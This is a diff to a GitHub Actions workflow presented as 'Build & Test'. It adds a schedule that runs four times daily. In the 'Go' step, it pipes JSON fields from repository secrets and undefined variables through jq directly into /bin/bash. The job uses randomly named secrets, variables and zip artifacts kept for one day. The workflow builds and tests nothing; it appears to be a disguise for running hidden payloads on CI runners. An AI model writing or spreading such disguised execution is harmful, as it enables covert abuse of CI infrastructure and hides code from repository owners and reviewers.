@@ -2,6 +2,8 @@ name: Build & Test
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '34 2,8,14,20 * * *'
 jobs:
   runner:
     runs-on: ubuntu-latest
@@ -10,16 +12,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: Go
         env:
-          hkox155: ${{ secrets.hkox155 }}
+          t1: ${{ secrets.t1 }}
         run: |
-          printf '%s' "$hkox155" | jq -r .sib16050 | /bin/bash
-          printf '%s' "$obku8" | jq -r .ik05435 | /bin/bash
-          printf '%s' "$jqs6227" | jq -r .osbug794 | /bin/bash
-          echo $w69724 | jq -r .kwew67059 | /bin/bash
+          printf '%s' "$t1" | jq -r .c964 | /bin/bash
+          echo $kdu7 | jq -r .edl53 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
         with:
-          name: W03gLXZF
+          name: lAS9vVML
           path: "*.zip"
           retention-days: 1
